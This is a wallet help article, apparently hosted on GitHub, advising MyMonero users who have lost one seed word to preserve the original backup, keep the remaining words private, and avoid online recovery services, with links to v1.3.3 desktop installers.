<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">MyMonero Lost Seed Word</h1>
<p align="center">Protect what remains of your backup and avoid risky guesses.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
If one word in a MyMonero seed is missing or unreadable, preserve the original backup and do not share the remaining words. Offline recovery of a missing word is not confirmed here, so avoid online recovery tools and anyone promising a guaranteed fix.

## You'll see this if
- A paper backup is torn, faded, or has one illegible entry.
- You remember most of the phrase but cannot recall one word.
- A restore form rejects a phrase because it is incomplete.
- You have an old app installation and are unsure whether it holds another backup.
- A person asks you to send the remaining words to “solve” the missing one.

## Why it happens
Seeds are exact recovery information. MyMonero uses a 13-word MyMonero-specific legacy format or a 25-word standard Monero format. Word count, spelling, and order matter, so a missing entry can prevent a restore. But attempting random replacements or rearranging the phrase may make it harder to keep track of what the original backup actually says.

There is no confirmed method in this guidance for recovering a missing seed word offline. Do not assume that a password, a private key, or a hosted account can supply it. MyMonero hosted servers and web wallet login stopped. The final MyMonero desktop release is v1.3.3; the old app still opens wallets and sends XMR but is no longer maintained and has no new features or security updates. The options are to keep using that desktop app if it remains accessible or restore the seed in Cake Wallet. See [seed formats compared](./mymonero-seed-13-vs-25-words.md), [finding a MyMonero seed](./find-mymonero-seed.md), and [the desktop release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

---

## Fix
1. **Stop copying the phrase into devices.** Do not type the known words into a search engine, note app, email, cloud document, or online checker. Keep the original paper and remaining information private.
2. **Preserve the original backup.** Store it securely as-is. If it is physically damaged, protect it from further wear and make a private copy of clearly legible entries without guessing at the unclear one. Keep the original even if you make a transcription.
3. **Establish the format and count.** Count entries privately. A MyMonero legacy seed has 13 words; the standard Monero format has 25. Confirm whether the backup is meant to contain either sequence. Do not assume a gap corresponds to a particular position unless the original layout makes that clear.
4. **Search your own backups.** Review other notebooks, copies, or secure records you created. Check the places you intentionally use for offline recovery. Do not ask another person to inspect a photo of the phrase. If a second copy exists, compare it privately and preserve both originals.
5. **Check the app only if you can do so safely.** If the old desktop wallet remains accessible, review its ordinary local wallet and backup options. Do not reset or uninstall the application as a first step. Whether a particular installation can display or export a seed is not guaranteed here; avoid third-party scripts or remote-access requests that claim to extract it.
6. **Do not guess online.** Some sites may claim to reconstruct a phrase from partial words. Do not give them even a few entries. Nobody legitimate asks for your seed. A person who receives the rest of the phrase could compromise the wallet even if they claim to be helping.
7. **Pause before any restore attempt.** If you find a complete, verified copy, choose the correct wallet restore path and understand the scanning process. Restore height is the block height where scanning begins; earlier is safer when uncertain but slower. See [restore height explained](./mymonero-restore-height-explained.md).

> [!WARNING]
> Never disclose the rest of your seed to recover one missing word. A partial phrase is still sensitive, and a complete phrase grants wallet access.

## If that did not work
If no complete backup can be found, avoid making repeated guesses in an unfamiliar restore screen. Keep a private record of what is known and what remains uncertain, but do not include actual words in a ticket or conversation. Offline recovery of a missing word is not confirmed, and no one should promise that providing the other words is safe.

If the old app still opens the wallet, you may continue to use it, but remember the final release v1.3.3 is no longer maintained. MyMonero’s hosted servers and web wallet login stopped. Do not erase the app or its data without understanding the consequences; specific data-folder paths are not provided here. Seek general device help without giving anyone remote access or sensitive wallet material.

If you later recover the full phrase, you can consider restoring it in Cake Wallet, which runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. Confirm the restore format and instructions. If a phrase is incomplete, do not start by sweeping: sweeping sends all funds to a new wallet and requires access to funds, so it is not a way to reconstruct a seed. Read [the safe migration checklist](./mymonero-migration-checklist.md) first.

## Prevention
Make a legible, offline seed backup at wallet setup. MyMonero’s formats are 13-word legacy and 25-word standard Monero; privately label the format and wallet identity without displaying the words. Check that the backup is complete and in order before storing it. Keep it protected from moisture, fire, loss, and unauthorized access.

Consider a second secure physical copy in a separate location, balancing resilience with privacy. Do not place the phrase in a photo library, email account, shared note, or cloud drive. Keep seed, password, private view key, and private spend key clearly distinct in your records. Review [safe seed backup practices](./mymonero-backup-seed-safely.md) and [private keys explained](./mymonero-private-view-spend-keys.md).

## FAQ
<details><summary>Can you recover a missing word from the others?</summary>

This guidance does not confirm an offline recovery method. Keep the remaining words private and do not submit them to a service.

</details>

<details><summary>Should I try likely replacement words?</summary>

Avoid guessing in unfamiliar software. Preserve the original and look for another complete backup first.

</details>

<details><summary>Can I send a photo to support?</summary>

No. A photo reveals seed information. Nobody legitimate asks for your seed.

</details>

<details><summary>Will my password restore the missing word?</summary>

A password and seed are different credentials. Do not assume a password can recreate a missing phrase entry.

</details>

---

## Download MyMonero

- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [MyMonero Private View and Spend Keys](./mymonero-private-view-spend-keys.md) | Learn what these wallet credentials mean and how to keep them private. |
| [Forgot MyMonero Password](./mymonero-forgot-password.md) | Separate an app password problem from wallet recovery. |
| [Back Up Your MyMonero Seed Safely](./mymonero-backup-seed-safely.md) | Keep recovery words private, legible, and available when you need them. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
